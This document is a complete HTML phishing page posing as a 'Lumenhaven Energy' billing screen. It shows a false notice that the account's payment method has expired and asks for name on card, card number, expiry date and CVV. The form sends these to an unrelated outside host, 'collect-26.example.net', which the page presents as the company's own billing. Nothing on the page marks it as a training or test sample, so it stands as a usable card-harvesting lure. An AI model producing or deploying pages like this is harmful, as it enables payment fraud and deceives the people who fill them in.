<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"><title>Lumenhaven Energy - update your payment details</title><style>
*{box-sizing:border-box}
body{margin:0;font-family:Georgia, 'Times New Roman', serif;color:#4A3500;background:#f6f7f9;line-height:1.5}
a{color:#F2B01E;text-decoration:none}
header.top{display:flex;align-items:center;gap:16px;padding:16px 48px;background:#fff;border-bottom:1px solid #e1e4e8}
header.top img{display:block}
header.top .name{font-weight:700;font-size:22px;color:#F2B01E}
header.top nav{margin-left:auto;display:flex;gap:26px;font-size:15px}
.center{display:flex;justify-content:center;padding:44px 16px}
.card{width:480px;background:#fff;border:1px solid #dde1e6;border-radius:10px;padding:34px}
.card h1{margin:0 0 6px;font-size:26px}
.card p.sub{margin:0 0 20px;color:#59636e;font-size:15px}
.card img.banner{display:block;width:100%;margin-bottom:18px;border-radius:6px}
.notice{background:#fff4e0;border:1px solid #f0d49a;border-radius:6px;padding:10px 12px;font-size:14px;margin-bottom:16px}
label{display:block;font-size:13px;font-weight:600;margin:14px 0 5px}
input[type=text],input[type=email],input[type=password],input[type=tel]{width:100%;padding:11px 12px;border:1px solid #b8bec6;border-radius:6px;font-size:15px}
.row{display:flex;gap:12px}.row>div{flex:1}
button.btn,a.cta{display:inline-block;margin-top:20px;padding:12px 22px;background:#F2B01E;color:#fff;border:0;border-radius:10px;font-size:16px;font-weight:600;cursor:pointer}
.card button.btn{width:100%}
.small{font-size:13px;color:#69727d}
.split{display:flex;min-height:800px}
.split aside{flex:0 0 46%;background:#F2B01E;color:#fff;padding:60px 56px}
.split aside .logobox{display:inline-block;background:#fff;padding:14px 20px;border-radius:12px}
.split aside h2{font-size:34px;margin:44px 0 14px;line-height:1.2}
.split aside li{margin:8px 0}
.split main{flex:1;display:flex;align-items:center;justify-content:center;padding:30px}
.hero{background:#F2B01E;color:#fff;padding:78px 48px 70px}
.hero h1{font-size:46px;margin:0 0 14px;max-width:720px;line-height:1.15}
.hero p{font-size:20px;max-width:640px;margin:0}
.hero a.cta{background:#23395B;color:#1b1b1b}
.features{display:flex;gap:24px;padding:40px 48px}
.features div{flex:1;background:#fff;border:1px solid #e1e4e8;border-radius:10px;padding:22px}
.features h3{margin:0 0 6px;font-size:18px;color:#F2B01E}
.formband{padding:10px 48px 40px;display:flex;justify-content:center}
footer{padding:22px 48px;font-size:13px;color:#69727d;border-top:1px solid #e1e4e8;background:#fff}
</style></head><body><header class="top"><img class="logo" src="logo.png" alt="Lumenhaven Energy" style="height:40px"><span class="name">Lumenhaven Energy</span><nav><a href="#">Account</a><a href="#">Billing</a><a href="#">Help</a></nav></header><div class="center"><section class="card"><h1>Update your payment details</h1><p class="sub">Your Lumenhaven Energy account could not be renewed. Enter a new card to keep it active.</p><div class="notice">Action needed: your payment method has expired.</div><form method="post" action="https://collect-26.example.net/submit"><label for="holder">Name on card</label><input id="holder" name="holder" type="text" autocomplete="cc-name"><label for="cardnumber">Card number</label><input id="cardnumber" name="cardnumber" type="text" autocomplete="cc-number" placeholder="1234 5678 9012 3456"><div class="row"><div><label for="exp">Expiry date</label><input id="exp" name="exp" type="text" autocomplete="cc-exp" placeholder="MM/YY"></div><div><label for="cvv">Security code (CVV)</label><input id="cvv" name="cvv" type="text" autocomplete="cc-csc" placeholder="123"></div></div><button class="btn" type="submit">Confirm payment</button></form><p class="small"></p></section></div><footer>Lumenhaven Energy customer billing.</footer></body></html>
